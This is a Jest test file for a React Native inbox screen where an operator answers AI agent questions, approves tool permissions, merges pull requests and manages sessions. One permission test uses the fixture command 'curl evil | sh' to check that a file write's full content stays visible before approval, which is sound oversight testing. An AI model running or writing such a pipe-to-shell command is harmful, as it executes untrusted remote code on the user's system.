jest.mock('expo-router', () => ({
  router: { push: jest.fn() },
  // Runs once on mount, like a screen gaining focus.
  useFocusEffect: (effect: () => void | (() => void)) => {
    const { useEffect } = jest.requireActual<typeof import('react')>('react');
    useEffect(effect, [effect]);
  },
}));
jest.mock('expo-crypto', () => {
  let n = 0;
  return { randomUUID: jest.fn(() => `reply-${String((n += 1))}`) };
});
jest.mock('../../lib/voiceShortcut', () => ({ dispatchVerityShortcut: jest.fn() }));
const mockCapture = { enabled: true, scope: 'account' as string | null };
jest.mock('../../lib/taskPreferences', () => ({
  useTaskPreferences: () => ({ enabled: mockCapture.enabled }),
}));
jest.mock('../../lib/tasksStore', () => ({ taskAccountScope: () => mockCapture.scope }));

import type {
  InboxItem,
  ProjectRecord,
  SessionSummary,
  UpcomingMeeting,
  VerityClient,
} from '@verity/mobile';
import { act, fireEvent, render, screen, within } from '@testing-library/react-native';
import { Alert, StyleSheet } from 'react-native';
import { darkTheme, lightTheme } from '../../theme/tokens';
import { router } from 'expo-router';
import { randomUUID } from 'expo-crypto';

import { dispatchVerityShortcut } from '../../lib/voiceShortcut';
import { HomeInbox, InboxCard, RESUME_PROMPT, replyFor } from './HomeInbox';

const ZERO_USAGE = {
  inputTokens: 0,
  outputTokens: 0,
  cacheReadTokens: 0,
  cacheCreationTokens: 0,
  turns: 0,
};

function session(id: string, over: Partial<SessionSummary> = {}): SessionSummary {
  return {
    sessionId: id,
    worktree: `/wt/${id}`,
    model: 'm',
    name: id,
    projectId: 'p1',
    status: 'completed',
    usage: ZERO_USAGE,
    lastActivityAt: Date.now() - 60_000,
    ...over,
  };
}

const project = {
  id: 'p1',
  owner: 'acme',
  repo: 'website',
  containerName: 'c',
  kind: 'github',
  imageRef: null,
  state: 'active',
  provisionError: null,
  createdAt: '2026-10-01T00:00:00Z',
  updatedAt: '2026-11-03T09:00:00Z',
} as ProjectRecord;

function fakeClient(meetings: Promise<UpcomingMeeting[]> = Promise.resolve([])) {
  return {
    getUpcomingMeetings: jest.fn(() => meetings),
    sendTurn: jest.fn(async () => ({})),
    decidePermission: jest.fn(async () => undefined),
    mergePullRequest: jest.fn(async () => ({})),
    joinCalendarMeeting: jest.fn(async () => ({ meetingId: 'm1' })),
    skipCalendarMeeting: jest.fn(async () => undefined),
    discardLiveMeeting: jest.fn(async () => undefined),
    setSessionInboxDismissed: jest.fn(async (_id: string, key: string, dismissed: boolean) =>
      dismissed ? [key] : [],
    ),
    setProjectInboxDismissed: jest.fn(async () => [] as string[]),
  };
}

async function renderInbox(
  sessions: SessionSummary[],
  client = fakeClient(),
  extra: { selectedSessionId?: string; onOpenVerity?: () => void; projects?: ProjectRecord[] } = {},
) {
  const onOpenSession = jest.fn();
  const onRepairProject = jest.fn();
  const onCountChange = jest.fn();
  const view = render(
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={sessions}
      projects={[project]}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={onOpenSession}
      onRepairProject={onRepairProject}
      onCountChange={onCountChange}
      {...extra}
    />,
  );
  // Let the calendar read settle, as a screen would before anyone taps.
  await act(async () => undefined);
  return { ...view, client, onOpenSession, onRepairProject, onCountChange };
}

const question = session('form', {
  openChoices: {
    question: 'Which validation library?',
    options: [{ label: 'Zod' }, { label: 'Valibot' }],
  },
});

beforeEach(() => {
  jest.clearAllMocks();
  mockCapture.enabled = true;
  mockCapture.scope = 'account';
});

it('says so when nothing needs the operator', async () => {
  const { onCountChange } = await renderInbox([session('quiet')]);
  expect(await screen.findByText('Nothing needs you right now.')).toBeTruthy();
  expect(screen.queryByText('For you')).toBeNull();
  expect(onCountChange).toHaveBeenLastCalledWith(0);
});

it('answers a question in place and hides it until the session moves on', async () => {
  const { client, onCountChange } = await renderInbox([question]);
  expect(await screen.findByText(/Which validation library\?$/)).toBeTruthy();
  expect(screen.getByTestId('home-summary').props.children).toBe('1 question');
  await act(async () => {
    fireEvent.press(screen.getByRole('button', { name: 'Zod' }));
  });
  // Sent through the same idempotent route a notification reply uses.
  expect(client.sendTurn).toHaveBeenCalledWith('form', {
    prompt: 'Zod',
    clientReplyId: jest.mocked(randomUUID).mock.results.at(-1)?.value,
  });
  expect(screen.queryByText(/Which validation library\?$/)).toBeNull();
  expect(onCountChange).toHaveBeenLastCalledWith(0);
});

it('opens long answers in full before sending a selected answer', async () => {
  const label = 'Build the admin bot with a token stored in Doppler';
  const longQuestion = {
    ...question,
    openChoices: {
      question: 'How should access work?',
      options: [{ label }, { label: 'Use the database' }],
    },
  };
  const { client } = await renderInbox([longQuestion]);
  expect(screen.queryByText(label)).toBeNull();
  fireEvent.press(screen.getByRole('button', { name: '2 answers' }));
  expect(screen.getByText(label)).toBeTruthy();
  expect(client.sendTurn).not.toHaveBeenCalled();
  await act(async () => fireEvent.press(screen.getByRole('button', { name: label })));
  expect(client.sendTurn).toHaveBeenCalledTimes(1);
  expect(client.sendTurn).toHaveBeenCalledWith('form', expect.objectContaining({ prompt: label }));
  expect(screen.queryByRole('button', { name: '2 answers' })).toBeNull();
});

it('keeps opening a long-answer sheet separate from writing an own answer', async () => {
  const label = 'Build the admin bot with a token stored in Doppler';
  const { client, onOpenSession } = await renderInbox([
    { ...question, openChoices: { question: 'How?', options: [{ label }] } },
  ]);
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  fireEvent.press(screen.getByRole('button', { name: 'Open session' }));
  expect(onOpenSession).toHaveBeenCalledWith('form');
  expect(client.sendTurn).not.toHaveBeenCalled();
  expect(screen.queryByText(label)).toBeNull();
});

it('sends a long answer only once when tapped twice before the sheet closes', async () => {
  const label = 'Build the admin bot with a token stored in Doppler';
  const client = fakeClient();
  let resolveSend!: (value: object) => void;
  client.sendTurn.mockImplementationOnce(
    () =>
      new Promise((resolve) => {
        resolveSend = resolve;
      }),
  );
  await renderInbox(
    [{ ...question, openChoices: { question: 'How?', options: [{ label }] } }],
    client,
  );
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  const choice = screen.getByRole('button', { name: label });
  act(() => {
    fireEvent.press(choice);
    fireEvent.press(choice);
  });
  expect(client.sendTurn).toHaveBeenCalledTimes(1);
  expect(screen.queryByText(label)).toBeNull();
  await act(async () => resolveSend({}));
});

it('removes a long-answer sheet when another client resolves the question', async () => {
  const label = 'Build the admin bot with a token stored in Doppler';
  const { client, rerender, onOpenSession, onRepairProject } = await renderInbox([
    { ...question, openChoices: { question: 'How?', options: [{ label }] } },
  ]);
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  expect(screen.getByText(label)).toBeTruthy();
  rerender(
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={[session('form')]}
      projects={[project]}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={onOpenSession}
      onRepairProject={onRepairProject}
    />,
  );
  expect(screen.queryByText(label)).toBeNull();
  expect(client.sendTurn).not.toHaveBeenCalled();
});

it('closes an open sheet when its question changes or the card becomes hidden', () => {
  const label = 'Build the admin bot with a token stored in Doppler';
  const item: InboxItem = {
    key: 'q',
    kind: 'question',
    title: 'How?',
    tag: 'Question',
    tone: 'attention',
    context: 'Project',
    at: 0,
    actions: [{ kind: 'answer', label, answer: label, sessionId: 'form' }],
  };
  const props = {
    item,
    selected: false,
    pending: false as const,
    disabled: false,
    onAction: jest.fn(),
  };
  const view = render(<InboxCard {...props} />);
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  expect(screen.getByText(label)).toBeTruthy();
  view.rerender(
    <InboxCard
      {...props}
      item={{
        ...item,
        actions: [
          {
            kind: 'answer',
            label,
            answer: 'A changed payload behind the same label',
            sessionId: 'form',
          },
        ],
      }}
    />,
  );
  expect(screen.queryByText(label)).toBeNull();
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  view.rerender(
    <InboxCard
      {...props}
      item={{ ...item, actions: [{ ...item.actions[0]!, label: `${label} instead` }] }}
    />,
  );
  expect(screen.queryByText(`${label} instead`)).toBeNull();
  fireEvent.press(screen.getByRole('button', { name: '1 answers' }));
  view.rerender(<InboxCard {...props} onRestore={jest.fn()} />);
  expect(screen.queryByText(label)).toBeNull();
});

it('keeps an item when the answer could not be delivered', async () => {
  const client = fakeClient();
  client.sendTurn.mockRejectedValueOnce(new Error('network down'));
  await renderInbox([question], client);
  await screen.findByText(/Which validation library\?$/);
  await act(async () => {
    fireEvent.press(screen.getByRole('button', { name: 'Valibot' }));
  });
  expect(screen.getByText(/Which validation library\?$/)).toBeTruthy();
  // The first request may have landed: the retry must carry the same idempotency
  // key, or the agent receives the answer twice.
  await act(async () => {
    fireEvent.press(screen.getByRole('button', { name: 'Valibot' }));
  });
  const ids = client.sendTurn.mock.calls.map(
    (call) => (call as unknown as [string, { clientReplyId: string }])[1].clientReplyId,
  );
  expect(ids).toHaveLength(2);
  expect(ids[1]).toBe(ids[0]);
});

it('decides a described permission without opening the session', async () => {
  const { client } = await renderInbox([
    session('egress', {
      status: 'awaiting_input',
      permissionAwaitingInput: true,
      pendingPermissions: ['t1'],
      pendingPermissionRequests: [
        {
          toolUseId: 't1',
          tool: 'WebFetch',
          riskClass: 'ask',
          input: { url: 'https://api.exa.ai' },
        },
      ],
    }),
  ]);
  const allow = await screen.findByRole('button', { name: 'Allow once' });
  await act(async () => {
    fireEvent.press(allow);
  });
  expect(client.decidePermission).toHaveBeenCalledWith('egress', 't1', { behavior: 'allow' });
});

it('opens the session for answers it cannot give in place', async () => {
  const { onOpenSession } = await renderInbox([question]);
  fireEvent.press(await screen.findByRole('button', { name: 'Own answer' }));
  expect(onOpenSession).toHaveBeenCalledWith('form');
});

it('offers an online meeting inside the join window and survives a failed calendar read', async () => {
  const soon: UpcomingMeeting = {
    eventKey: 'cal:weekly',
    title: 'Weekly sync',
    startsAt: Date.now() + 10 * 60_000,
    endsAt: Date.now() + 70 * 60_000,
    calendar: 'Work',
    provider: 'meet',
    decision: null,
    meetingId: null,
  };
  const { client, unmount } = await renderInbox([], fakeClient(Promise.resolve([soon])));
  const join = await screen.findByRole('button', { name: 'Join with Verity' });
  await act(async () => {
    fireEvent.press(join);
  });
  expect(client.joinCalendarMeeting).toHaveBeenCalledWith('cal:weekly');
  unmount();

  await renderInbox([question], fakeClient(Promise.reject(new Error('calendar unavailable'))));
  expect(await screen.findAllByText(/Which validation library\?$/)).toHaveLength(1);
});

it('opens a project and hands repair to the overview', async () => {
  const broken = { ...project, id: 'broken', state: 'failed', provisionError: 'Image pull failed' };
  const onRepairProject = jest.fn();
  render(
    <HomeInbox
      client={fakeClient() as unknown as VerityClient}
      sessions={[]}
      projects={[broken as ProjectRecord]}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={jest.fn()}
      onRepairProject={onRepairProject}
    />,
  );
  await act(async () => undefined);
  fireEvent.press(await screen.findByLabelText('Repair'));
  expect(onRepairProject).toHaveBeenCalledWith('broken');
  // The row itself leads to its project, as every needs-you row leads to its subject.
  expect(screen.queryByRole('button', { name: 'Open' })).toBeNull();
  fireEvent.press(screen.getByText('acme/website'));
  expect(router.push).toHaveBeenCalledWith({ pathname: '/project/[id]', params: { id: 'broken' } });
});

it('opens Verity from "Tell Verity"', async () => {
  await renderInbox([]);
  fireEvent.press(await screen.findByRole('button', { name: 'Tell Verity' }));
  expect(dispatchVerityShortcut).toHaveBeenCalledWith();
});

it('maps every network answer to the push-reply route it reuses', () => {
  expect(replyFor({ kind: 'resume', label: 'Resume', sessionId: 's' })).toEqual({
    type: 'send-turn',
    sessionId: 's',
    prompt: RESUME_PROMPT,
  });
  expect(replyFor({ kind: 'merge', label: 'Merge', sessionId: 's', number: 7 })).toEqual({
    type: 'merge-pull-request',
    sessionId: 's',
    pullRequestNumber: 7,
  });
  expect(replyFor({ kind: 'deny', label: 'Deny', sessionId: 's', toolUseId: 't' })).toMatchObject({
    decision: { behavior: 'deny' },
  });
  expect(replyFor({ kind: 'skip_meeting', label: 'Skip', eventKey: 'e' })).toEqual({
    type: 'skip-calendar-meeting',
    eventKey: 'e',
  });
  expect(replyFor({ kind: 'open_session', label: 'Open', sessionId: 's' })).toBeNull();
});

it('hides "Tell Verity" while quick capture cannot open', async () => {
  mockCapture.enabled = false;
  await renderInbox([]);
  expect(screen.queryByRole('button', { name: 'Tell Verity' })).toBeNull();
});

it('shows a permission’s whole command next to Allow and its raw input one tap away', async () => {
  // Home opened on a JSON dump for every tool without its own summary.
  const command = Array.from({ length: 30 }, (_, i) => `step ${String(i)}`).join(' && ');
  await renderInbox([
    session('shell', {
      status: 'awaiting_input',
      permissionAwaitingInput: true,
      pendingPermissions: ['t1'],
      pendingPermissionRequests: [
        {
          toolUseId: 't1',
          tool: 'Bash',
          riskClass: 'ask',
          // A field no tool summary shows: approving must not hide it.
          input: { command, description: 'hidden-detail' },
        },
      ],
    }),
  ]);
  await screen.findByRole('button', { name: 'Allow once' });
  // The command is read whole, never squashed to a headline: its tail is the risk.
  const line = screen.getByTestId('inbox-line-code');
  expect(line.props.numberOfLines).toBeUndefined();
  expect(line.props.children).toBe(command);
  expect(screen.queryByText(/"command"/)).toBeNull();
  // Every other field still travels with Allow, unclipped, behind one tap.
  expect(screen.queryByTestId('inbox-request')).toBeNull();
  fireEvent.press(screen.getByText('Full request'));
  const request = screen.getByTestId('inbox-request');
  expect(request.props.numberOfLines).toBeUndefined();
  expect(request.props.children).toContain('step 29');
  expect(request.props.children).toContain('hidden-detail');
});

it('keeps a write’s content in view next to Allow', async () => {
  // The path alone would be a summary of the call, not what it writes.
  await renderInbox([
    session('writer', {
      status: 'awaiting_input',
      permissionAwaitingInput: true,
      pendingPermissions: ['t1'],
      pendingPermissionRequests: [
        {
          toolUseId: 't1',
          tool: 'Write',
          riskClass: 'ask',
          input: { file_path: '/w/a.sh', content: 'curl evil | sh' },
        },
      ],
    }),
  ]);
  await screen.findByRole('button', { name: 'Allow once' });
  expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
  expect(screen.queryByText('Full request')).toBeNull();
  expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
});

it('keeps a session with a permission and a ready pull request in one card', async () => {
  // Home drew the permission card and, under it, a second box for the merge.
  await renderInbox([
    session('both', {
      status: 'awaiting_input',
      eventCount: 9,
      lastSeenEventCount: 2,
      permissionAwaitingInput: true,
      pendingPermissions: ['t1'],
      pendingPermissionRequests: [
        { toolUseId: 't1', tool: 'Bash', riskClass: 'ask', input: { command: 'ls' } },
      ],
      pr: { phase: 'open', pipeline: 'success', mergeable: true },
      pullRequest: {
        number: 551,
        title: 'fix(ocr-engine): survive layout faults',
        url: 'https://github.com/acme/website/pull/551',
        phase: 'open',
        pipeline: 'success',
        mergeable: true,
        viewerCanMerge: true,
      } as SessionSummary['pullRequest'],
    } as Partial<SessionSummary>),
  ]);
  const needs = within(await screen.findByTestId('work-needs-you'));
  expect(needs.getAllByTestId(/^inbox-item-/)).toHaveLength(1);
  expect(needs.queryByText('fix(ocr-engine): survive layout faults')).toBeNull();
  expect(needs.queryByRole('button', { name: 'Merge' })).toBeNull();
  expect(needs.getByTestId('inbox-also')).toHaveTextContent('Also waiting: Merge ready');
  // Unread sits on the card, not as a loose label above it.
  const card = needs.getByTestId('inbox-item-permission');
  expect(within(card).getByLabelText('Unread messages')).toBeTruthy();
  expect(needs.queryByText('Unread')).toBeNull();
});

it('words a secret run first and keeps its full request one tap away', async () => {
  // Home showed "Verity · Secret · Run" over a JSON dump, while the session asked
  // which secrets would go to which command.
  await renderInbox([
    session('k8s', {
      status: 'awaiting_input',
      permissionAwaitingInput: true,
      pendingPermissions: ['t1'],
      pendingPermissionRequests: [
        {
          toolUseId: 't1',
          tool: 'verity_secret_run',
          riskClass: 'ask',
          input: {
            command: ['/usr/local/bin/cluster-inspect', 'job', 'e2e'],
            secrets: [{ env: 'KUBECONFIG_FILE', injection: 'file', secretAlias: 'KUBECONFIG' }],
          },
        },
      ],
    }),
  ]);
  expect(await screen.findByText('Run trusted command with KUBECONFIG?')).toBeOnTheScreen();
  expect(screen.getByTestId('inbox-line-code').props.children).toBe(
    '"/usr/local/bin/cluster-inspect" "job" "e2e"',
  );
  expect(screen.getByTestId('inbox-line-text').props.children).toContain(
    'KUBECONFIG as a file at KUBECONFIG_FILE',
  );
  expect(screen.queryByTestId('inbox-request')).toBeNull();
  fireEvent.press(screen.getByText('Full request'));
  expect(screen.getByTestId('inbox-request').props.children).toContain('"secretAlias"');
});

describe('dismissing', () => {
  const dismissible = { ...question, inboxDismissed: [] as string[] };

  it('hides an item at once, saves it for the operator and keeps it out of the count', async () => {
    const { client, onCountChange } = await renderInbox([dismissible]);
    await screen.findByText(/Which validation library\?$/);
    await act(async () => {
      fireEvent.press(screen.getByRole('button', { name: 'Dismiss' }));
    });
    expect(client.setSessionInboxDismissed).toHaveBeenCalledWith(
      'form',
      expect.stringMatching(/^question:form/),
      true,
    );
    expect(screen.queryByText(/Which validation library\?$/)).toBeNull();
    expect(screen.getByTestId('home-summary').props.children).toBe('Nothing needs you right now.');
    expect(onCountChange).toHaveBeenLastCalledWith(0);
    expect(screen.getByRole('button', { name: '1 hidden' })).toBeTruthy();
  });

  it('brings the card back with a message when saving fails', async () => {
    const alert = jest.spyOn(Alert, 'alert').mockImplementation(() => undefined);
    const client = fakeClient();
    client.setSessionInboxDismissed.mockRejectedValueOnce(new Error('offline'));
    await renderInbox([dismissible], client);
    await screen.findByText(/Which validation library\?$/);
    await act(async () => {
      fireEvent.press(screen.getByRole('button', { name: 'Dismiss' }));
    });
    expect(screen.getByText(/Which validation library\?$/)).toBeTruthy();
    expect(alert).toHaveBeenCalledWith('Not hidden', expect.any(String));
    expect(screen.queryByRole('button', { name: '1 hidden' })).toBeNull();
  });

  it('shows what was dismissed elsewhere, muted, and restores it', async () => {
    const key = 'question:form:';
    // The key is derived from the question; read the live one off a first render.
    const first = await renderInbox([dismissible]);
    await screen.findByText(/Which validation library\?$/);
    await act(async () => {
      fireEvent.press(screen.getByRole('button', { name: 'Dismiss' }));
    });
    const [, savedKey] = first.client.setSessionInboxDismissed.mock.calls[0] as unknown as [
      string,
      string,
    ];
    expect(savedKey.startsWith(key)).toBe(true);
    first.unmount();

    // Another device: the synced list already carries the dismissal.
    const { client, onCountChange } = await renderInbox([
      { ...question, inboxDismissed: [savedKey] },
    ]);
    expect(screen.queryByText(/Which validation library\?$/)).toBeNull();
    expect(onCountChange).toHaveBeenLastCalledWith(0);
    fireEvent.press(screen.getByRole('button', { name: '1 hidden' }));
    expect(screen.getByTestId('inbox-hidden-question')).toBeTruthy();
    // A dismissed item offers only Restore, never its answers.
    expect(screen.queryByRole('button', { name: 'Zod' })).toBeNull();
    await act(async () => {
      fireEvent.press(screen.getByRole('button', { name: 'Restore' }));
    });
    expect(client.setSessionInboxDismissed).toHaveBeenCalledWith('form', savedKey, false);
    expect(
      within(screen.getByTestId('work-needs-you')).getByText(/Which validation library\?$/),
    ).toBeTruthy();
    expect(onCountChange).toHaveBeenLastCalledWith(1);
  });

  it('offers no X when the server cannot keep a dismissal', async () => {
    await renderInbox([question]);
    await screen.findByText(/Which validation library\?$/);
    expect(screen.queryByRole('button', { name: 'Dismiss' })).toBeNull();
  });

  it('skips a meeting when its X is tapped', async () => {
    const soon: UpcomingMeeting = {
      eventKey: 'cal:weekly',
      title: 'Weekly sync',
      startsAt: Date.now() + 10 * 60_000,
      endsAt: Date.now() + 70 * 60_000,
      calendar: 'Work',
      provider: 'meet',
      decision: null,
      meetingId: null,
    };
    const { client } = await renderInbox([], fakeClient(Promise.resolve([soon])));
    await screen.findByText('Weekly sync');
    await act(async () => {
      fireEvent.press(screen.getByRole('button', { name: 'Dismiss' }));
    });
    expect(client.skipCalendarMeeting).toHaveBeenCalledWith('cal:weekly');
    expect(client.setSessionInboxDismissed).not.toHaveBeenCalled();
  });
});

it('opens Verity’s page from her header only when Home is given the way there', async () => {
  const onOpenVerity = jest.fn();
  await renderInbox([], fakeClient(), { onOpenVerity });
  fireEvent.press(screen.getByTestId('home-verity'));
  expect(onOpenVerity).toHaveBeenCalled();
});

it('keeps Verity’s header a plain identity without a page to open', async () => {
  await renderInbox([]);
  expect(screen.queryByTestId('home-verity')).toBeNull();
});

it('shows a waiting mockup review as a normal action rather than a problem', async () => {
  await renderInbox([
    session('review', {
      mockupReview: {
        state: 'pending',
        revision: 1,
        screens: [
          {
            name: 'Home',
            attachment: 'a'.repeat(64),
            mediaType: 'image/png',
            width: 1,
            height: 1,
            verdict: 'open',
          },
        ],
      },
    }),
  ]);
  expect(screen.getByLabelText('Mockups, waiting for you')).toBeTruthy();
  const style = StyleSheet.flatten(screen.getByText('Mockups').props.style) as { color: string };
  expect([darkTheme.colors.action, lightTheme.colors.action]).toContain(style.color);
  expect(screen.queryByLabelText('Mockups, needs attention')).toBeNull();
});

it('uses the project work groups across projects without counting progress or unread results as decisions', async () => {
  const running = session('agent-working', { status: 'running' });
  const ci = session('checks-running', {
    pr: { phase: 'open', pipeline: 'running', mergeable: null },
  });
  const failed = session('checks-failed', {
    pr: { phase: 'open', pipeline: 'failure', mergeable: false },
  });
  const unread = session('new-answer', { eventCount: 8, lastSeenEventCount: 4 });
  const { onCountChange } = await renderInbox([question, running, ci, failed, unread]);
  const needs = within(screen.getByTestId('work-needs-you'));
  const active = within(screen.getByTestId('work-active'));
  const results = within(screen.getByTestId('work-results'));
  expect(needs.getByText('form')).toBeTruthy();
  expect(
    needs.getByRole('button', { name: /form, acme\/website, Which validation library/ }),
  ).toBeTruthy();
  expect(needs.getByText('checks-failed')).toBeTruthy();
  expect(active.getByText('agent-working')).toBeTruthy();
  expect(active.getByText('checks-running')).toBeTruthy();
  expect(results.getByText('new-answer')).toBeTruthy();
  expect(screen.getByText('Needs you · 2')).toBeTruthy();
  expect(screen.getByText('In progress · 2')).toBeTruthy();
  expect(screen.getByText('Results · 1')).toBeTruthy();
  expect(onCountChange).toHaveBeenLastCalledWith(2);
  expect(screen.queryByRole('tab', { name: /^Now/ })).toBeNull();
});

it('moves a Home session from work to a question and back without refreshing', async () => {
  const running = session('form', { status: 'running' });
  const { rerender, client, onOpenSession, onRepairProject } = await renderInbox([running]);
  const page = (sessions: SessionSummary[]) => (
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={sessions}
      projects={[project]}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={onOpenSession}
      onRepairProject={onRepairProject}
    />
  );
  expect(within(screen.getByTestId('work-active')).getByText('form')).toBeTruthy();
  rerender(page([question]));
  expect(within(screen.getByTestId('work-needs-you')).getByText('form')).toBeTruthy();
  expect(screen.queryByTestId('work-active')).toBeNull();
  rerender(page([running]));
  expect(within(screen.getByTestId('work-active')).getByText('form')).toBeTruthy();
  expect(screen.queryByTestId('work-needs-you')).toBeNull();
  expect(screen.getAllByText('form')).toHaveLength(1);
});

it('leads with the permission and names the session’s question on the same card', async () => {
  // Both used to show as separate boxes for one session; the permission blocks the
  // agent, so it leads, and the question comes forward once it is answered.
  const waiting: SessionSummary = {
    ...question,
    pendingPermissions: ['permission-1'],
    permissionAwaitingInput: true,
  };
  const { onCountChange } = await renderInbox([waiting]);
  const needs = within(screen.getByTestId('work-needs-you'));
  expect(needs.getByText('Permission needed')).toBeTruthy();
  expect(needs.getAllByTestId(/^inbox-item-/)).toHaveLength(1);
  expect(needs.getByTestId('inbox-also')).toHaveTextContent('Also waiting: Question');
  expect(needs.queryByRole('button', { name: 'Zod' })).toBeNull();
  expect(onCountChange).toHaveBeenLastCalledWith(1);
});

it('keeps archived project problems, running work and unread results out of Home', async () => {
  const archived = { ...project, archived: true };
  const sessions = [
    session('failed', { pr: { phase: 'open', pipeline: 'failure', mergeable: false } }),
    session('conflict', {
      pr: { phase: 'open', pipeline: 'unknown', mergeable: false, mergeState: 'dirty' },
    }),
    session('disconnected', {
      attention: [{ code: 'sandbox_disconnected', message: 'Connection lost' }],
    }),
    session('working', { status: 'running' }),
    session('unread', { eventCount: 8, lastSeenEventCount: 2 }),
  ];
  const { onCountChange } = await renderInbox(sessions, fakeClient(), { projects: [archived] });
  expect(screen.queryByTestId('work-needs-you')).toBeNull();
  expect(screen.queryByTestId('work-active')).toBeNull();
  expect(screen.queryByTestId('work-results')).toBeNull();
  expect(onCountChange).toHaveBeenLastCalledWith(0);
});

it('keeps read results in place, appends new results and clears them only on explicit refresh', async () => {
  const client = Object.assign(fakeClient(), { setSessionSeen: jest.fn(async () => undefined) });
  const first = session('first-result', { eventCount: 5, lastSeenEventCount: 2 });
  const second = session('second-result', { eventCount: 6, lastSeenEventCount: 3 });
  const page = (sessions: SessionSummary[], layoutRevision = 0) => (
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={sessions}
      projects={[project]}
      selectedSessionId="first-result"
      refreshing={false}
      layoutRevision={layoutRevision}
      onRefresh={jest.fn()}
      onOpenSession={jest.fn()}
      onRepairProject={jest.fn()}
    />
  );
  const view = render(page([first]));
  await act(async () => undefined);
  fireEvent.press(screen.getByLabelText('first-result, acme/website, new answer'));
  expect(screen.queryByLabelText('Unread messages')).toBeNull();
  expect(screen.getByText('first-result')).toBeTruthy();
  expect(screen.queryByText(/1 new result/)).toBeNull();
  const read = { ...first, lastSeenEventCount: 5 };
  view.rerender(page([second, read]));
  const labels = () =>
    within(screen.getByTestId('work-results'))
      .getAllByRole('button')
      .map((row) => row.props.accessibilityLabel as string)
      .filter((label) => /^(first|second)-result/.test(label));
  expect(labels()).toEqual([
    'first-result, acme/website',
    'second-result, acme/website, new answer',
  ]);
  expect(screen.getByTestId('home-summary')).toHaveTextContent(/1 new results/);
  view.rerender(page([read, { ...second, lastSeenEventCount: 6 }]));
  expect(labels()).toEqual(['first-result, acme/website', 'second-result, acme/website']);
  view.rerender(page([read, { ...second, lastSeenEventCount: 6 }], 1));
  expect(screen.queryByTestId('work-results')).toBeNull();
});

it('appends a session to its destination category and keeps live actions current', async () => {
  const client = fakeClient();
  const result = session('result', { eventCount: 5, lastSeenEventCount: 2 });
  const worker = session('worker', { status: 'running' });
  const page = (sessions: SessionSummary[]) => (
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={sessions}
      projects={[project]}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={jest.fn()}
      onRepairProject={jest.fn()}
    />
  );
  const view = render(page([result, worker]));
  await act(async () => undefined);
  const asking = { ...question, sessionId: result.sessionId, name: result.name };
  view.rerender(page([asking, worker]));
  expect(within(screen.getByTestId('work-needs-you')).getByText('result')).toBeTruthy();
  expect(screen.queryByTestId('work-results')).toBeNull();
  const running = { ...result, status: 'running' as const, lastSeenEventCount: 5 };
  view.rerender(page([running, worker]));
  expect(screen.queryByRole('button', { name: 'Zod' })).toBeNull();
  expect(screen.queryByTestId('work-needs-you')).toBeNull();
  const labels = within(screen.getByTestId('work-active'))
    .getAllByRole('button')
    .map((row) => row.props.accessibilityLabel as string)
    .filter((label) => /^(worker|result),/.test(label));
  expect(labels).toEqual(['worker, acme/website, working', 'result, acme/website, working']);
  expect(screen.getAllByText('result')).toHaveLength(1);
});

it('drops retained results when they leave the project, are archived or deleted', async () => {
  const client = fakeClient();
  const unread = session('retained', { eventCount: 5, lastSeenEventCount: 2 });
  const page = (sessions: SessionSummary[], projects = [project]) => (
    <HomeInbox
      client={client as unknown as VerityClient}
      sessions={sessions}
      projects={projects}
      refreshing={false}
      onRefresh={jest.fn()}
      onOpenSession={jest.fn()}
      onRepairProject={jest.fn()}
    />
  );
  const view = render(page([unread]));
  await act(async () => undefined);
  const read = { ...unread, lastSeenEventCount: 5 };
  view.rerender(page([read]));
  expect(screen.getByText('retained')).toBeTruthy();
  view.rerender(page([{ ...read, projectId: 'other' }]));
  expect(screen.queryByText('retained')).toBeNull();
  view.rerender(page([unread]));
  view.rerender(page([read], [{ ...project, archived: true }]));
  expect(screen.queryByText('retained')).toBeNull();
  view.rerender(page([unread]));
  view.rerender(page([read]));
  view.rerender(page([]));
  expect(screen.queryByText('retained')).toBeNull();
});

// Inside "Needs you" a card is one entry of the section's group. Drawing its
// own border and corners as well left a rounded card frame inside the group's
// frame, touching the next row, and selection only outlined the card.
it('draws a decision card as an entry of the work group, filled when selected', async () => {
  // A session with a second decision is still one entry, so the selection
  // fills that one card rather than outlining part of a stacked block.
  const waiting = session('permission', {
    ...question,
    sessionId: 'permission',
    pendingPermissions: ['permission-1'],
    permissionAwaitingInput: true,
  });
  await renderInbox([waiting], fakeClient(), { selectedSessionId: waiting.sessionId });
  // The card's own surface: the first drawn view inside the item.
  const frame = (testID: string) =>
    StyleSheet.flatten(
      screen
        .getByTestId(testID)
        .findAll((node) => typeof node.type === 'string' && node.props.style !== undefined)[0]!
        .props.style,
    ) as Record<string, unknown>;
  const permissionCard = frame('inbox-item-permission');
  expect(permissionCard.borderWidth).toBe(0);
  expect(permissionCard.borderRadius).toBe(0);
  expect(permissionCard.backgroundColor).toBe(lightTheme.colors.surfaceAlt);
  expect(permissionCard.shadowColor).toBeUndefined();
});
